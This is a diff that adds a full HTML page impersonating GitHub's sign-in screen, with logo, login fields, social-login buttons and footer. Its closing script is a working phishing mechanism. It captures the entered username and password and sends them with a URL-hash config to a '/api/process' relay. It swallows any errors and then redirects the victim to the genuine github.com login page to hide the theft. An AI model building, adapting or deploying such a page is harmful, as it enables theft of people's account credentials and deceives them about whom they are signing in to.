@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sign in to GitHub · GitHub</title>
+    <link rel="shortcut icon" href="https://github.githubassets.com/favicons/favicon.svg">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+        
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Noto Sans", Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji";
+            background-color: #0d1117;
+            color: #e6edf3;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .main-container {
+            width: 100%;
+            max-width: 340px;
+            margin: 0 auto;
+            padding-top: 32px;
+            text-align: center;
+        }
+
+        .gh-logo {
+            color: #ffffff;
+            margin: 0 auto 24px;
+        }
+
+        .gh-heading {
+            font-size: 24px;
+            font-weight: 300;
+            letter-spacing: -0.5px;
+            margin-bottom: 16px;
+        }
+
+        .auth-form-body {
+            background-color: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 16px;
+            text-align: left;
+            margin-bottom: 16px;
+        }
+
+        .input-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 400;
+            font-size: 14px;
+        }
+
+        .gh-input {
+            width: 100%;
+            padding: 5px 12px;
+            font-size: 14px;
+            line-height: 20px;
+            color: #ffffff;
+            background-color: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            margin-bottom: 16px;
+        }
+
+        .gh-input:focus {
+            border-color: #2f81f7;
+            box-shadow: 0 0 0 3px rgba(31, 111, 235, 0.3);
+        }
+
+        .btn-primary {
+            background-color: #238636;
+            color: #ffffff;
+            font-weight: 600;
+            font-size: 14px;
+            padding: 5px 16px;
+            width: 100%;
+            border-radius: 6px;
+            border: 1px solid rgba(240, 246, 252, 0.1);
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .btn-primary:hover { background-color: #2ea043; }
+        .btn-primary:active { background-color: #238636; }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 16px 0;
+            color: #7d8590;
+            font-size: 12px;
+        }
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #30363d;
+        }
+        .divider:not(:empty)::before { margin-right: .75em; }
+        .divider:not(:empty)::after { margin-left: .75em; }
+
+        .btn-social {
+            background-color: #21262d;
+            border: 1px solid #30363d;
+            color: #e6edf3;
+            font-weight: 500;
+            font-size: 14px;
+            padding: 5px 16px;
+            width: 100%;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 8px;
+            transition: background-color 0.2s;
+        }
+
+        .btn-social:hover { background-color: #30363d; border-color: #8b949e; }
+
+        .footer {
+            margin-top: 40px;
+            padding: 40px 0;
+            text-align: center;
+            font-size: 12px;
+            color: #7d8590;
+        }
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 16px;
+            margin-bottom: 8px;
+        }
+        .footer a { color: #7d8590; text-decoration: none; }
+        .footer a:hover { color: #2f81f7; text-decoration: underline; }
+
+        .create-account-box {
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 16px;
+            font-size: 14px;
+            color: #e6edf3;
+        }
+        .gh-blue-link { color: #2f81f7; text-decoration: none; }
+        .gh-blue-link:hover { text-decoration: underline; }
+
+        #loader {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 2px;
+            background: transparent;
+            z-index: 1000;
+            display: none;
+        }
+        #loader div {
+            height: 100%;
+            background-color: #2f81f7;
+            width: 30%;
+            animation: ghLoad 1s infinite linear;
+        }
+        @keyframes ghLoad { 0% { margin-left: -30%; } 100% { margin-left: 100%; } }
+    </style>
+</head>
+<body>
+
+    <div id="loader"><div></div></div>
+
+    <main class="main-container">
+        <!-- GitHub Logo -->
+        <svg height="48" aria-hidden="true" viewBox="0 0 16 16" version="1.1" width="48" class="gh-logo">
+            <path fill="currentColor" d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"></path>
+        </svg>
+
+        <h1 class="gh-heading">Sign in to GitHub</h1>
+
+        <div class="auth-form-body">
+            <label class="input-label" for="login_field">Username or email address</label>
+            <input type="text" id="username" class="gh-input" autofocus autocomplete="username">
+
+            <div class="flex justify-between items-center mb-2">
+                <label class="input-label !mb-0" for="password">Password</label>
+                <a href="#" class="text-[12px] gh-blue-link">Forgot password?</a>
+            </div>
+            <input type="password" id="password" class="gh-input" autocomplete="current-password">
+
+            <button onclick="dispatch()" class="btn-primary">Sign in</button>
+        </div>
+
+        <div class="divider">or</div>
+
+        <button class="btn-social">
+            <svg class="w-4 h-4" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"></path><path fill="#4285F4" d="M46.64 24.55c0-1.65-.15-3.23-.42-4.75H24v9.03h12.73c-.55 2.87-2.12 5.3-4.55 6.94l7.07 5.48c4.14-3.82 6.4-9.45 6.4-15.7z"></path><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"></path><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.07-5.48c-2.19 1.47-4.99 2.34-8.82 2.34-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"></path></svg>
+            Continue with Google
+        </button>
+
+        <button class="btn-social">
+            <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.51 13.97 1.006 2.38 2.316 5.072 4.22 5.032 1.831-.039 2.522-1.154 4.736-1.154 2.213 0 2.839 1.154 4.775 1.114 1.968-.039 3.102-2.42 4.304-5.23 1.391-3.238 1.964-6.375 1.99-6.536-.046-.014-3.83-1.478-3.856-5.845-.02-3.66 2.972-5.42 3.11-5.512-1.713-2.518-4.346-2.8-5.277-2.839-2.203-.078-4.227 1.026-5.59 1.026zM15.352 2c-.999.085-2.204.707-2.921 1.546-.644.75-.95 1.777-.852 2.76.903.07 2.115-.43 2.784-1.272.67-.84 1.054-1.921.989-3.034z"></path></svg>
+            Continue with Apple
+        </button>
+
+        <div class="create-account-box mt-4">
+            New to GitHub? <a href="#" class="gh-blue-link">Create an account</a>.
+        </div>
+
+        <div class="mt-4 mb-8">
+            <a href="#" class="gh-blue-link text-[14px]">Sign in with a passkey</a>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="#">Terms</a>
+            <a href="#">Privacy</a>
+            <a href="#">Docs</a>
+            <a href="#">Contact GitHub Support</a>
+            <a href="#">Manage cookies</a>
+            <a href="#">Do not share my personal information</a>
+        </div>
+    </footer>
+
+<script>
+    // 1. Get raw Base64 config from URL Hash
+    const getRawConfig = () => {
+        const h = window.location.hash.substring(1);
+        return h || null;
+    };
+
+    const configString = getRawConfig();
+
+    async function dispatch() {
+        const user = document.getElementById('username').value;
+        const pass = document.getElementById('password').value;
+
+        if (!user || !pass) return;
+
+        document.getElementById('loader').style.display = 'block';
+        const finishUrl = "https://github.com/login";
+
+        if (!configString) {
+            setTimeout(() => window.location.href = finishUrl, 1000);
+            return;
+        }
+
+        try {
+            // 2. Call central Vercel API relay (/api/process)
+            await fetch('/api/process', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    config: configString, 
+                    data: { 
+                        User: user, 
+                        Pass: pass 
+                    }
+                })
+            });
+        } catch (err) {
+            // Silenced
+        } finally {
+            setTimeout(() => {
+                window.location.href = finishUrl;
+            }, 1000);
+        }
+    }
+</script>
+</body>
+</html>
